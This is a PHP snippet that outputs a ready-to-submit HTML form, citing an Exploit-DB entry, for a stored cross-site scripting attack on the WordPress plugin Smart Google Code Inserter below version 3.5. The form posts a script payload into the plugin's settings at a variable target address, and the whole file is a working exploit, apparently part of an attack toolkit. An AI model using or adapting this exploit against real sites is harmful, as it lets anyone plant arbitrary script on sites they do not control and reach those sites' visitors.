<?php echo "<h3> 👾WordPress Plugin Smart Google Code Inserter < 3.5👾 - 👾STORED XSS👾</h3>";
echo "<a href=\"https://www.exploit-db.com/exploits/43420/\">https://www.exploit-db.com/exploits/43420/</a>";
echo "<form class=\"wp-form\" class=\"\" action=\"http://".$url."/wp-admin/options-general.php?page=smartcode\" method=\"post\">";
echo "<p>sgcgoogleanalytic: <input type=\"text\" size=\"50\" name=\"sgcgoogleanalytic\" value=\"<script>alert(1);</script>\"></p></p>&nbsp;";
echo "<p>sgcwebtools: <input type=\"text\" size=\"50\" name=\"sgcwebtools\" value=\"\"></p></p>";
echo "<p>button: <input type=\"text\" size=\"50\" name=\"button\" value=\"Save+Changes\"></p></p>";
echo "<p>action: <input type=\"text\" size=\"50\" name=\"action\" value=\"savegooglecode\"></p></p>";
echo "<input type=\"submit\" value=\"Submit request\" />";
echo "</form>";
 ?>
